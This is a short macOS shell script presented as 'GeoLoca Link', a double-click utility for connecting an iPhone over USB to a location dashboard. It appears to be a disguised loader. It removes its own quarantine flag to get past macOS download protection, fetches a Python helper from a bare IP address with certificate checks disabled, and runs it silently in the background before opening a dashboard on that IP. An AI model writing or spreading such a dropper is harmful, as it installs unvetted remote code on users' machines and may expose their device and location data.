#!/bin/bash
# GeoLoca Link — double-click to connect your iPhone over USB
set -e
xattr -d com.apple.quarantine "$0" 2>/dev/null || true
DIR="$HOME/.geoloca"
mkdir -p "$DIR"
SITE="https://109.71.252.128"

if [ -f "$(dirname "$0")/usb_helper.py" ]; then
  cp "$(dirname "$0")/usb_helper.py" "$DIR/usb_helper.py"
elif [ ! -f "$DIR/usb_helper.py" ]; then
  curl -fsSLk "$SITE/connect/usb_helper.py" -o "$DIR/usb_helper.py"
fi

pkill -f "$DIR/usb_helper.py" 2>/dev/null || true
nohup python3 "$DIR/usb_helper.py" >> "$DIR/link.log" 2>&1 &
sleep 1

if command -v open >/dev/null 2>&1; then
  open "$SITE/dashboard"
fi

echo "GeoLoca Link is running. Your dashboard will detect the iPhone on USB."
read -r -p "Press Enter to close…" _
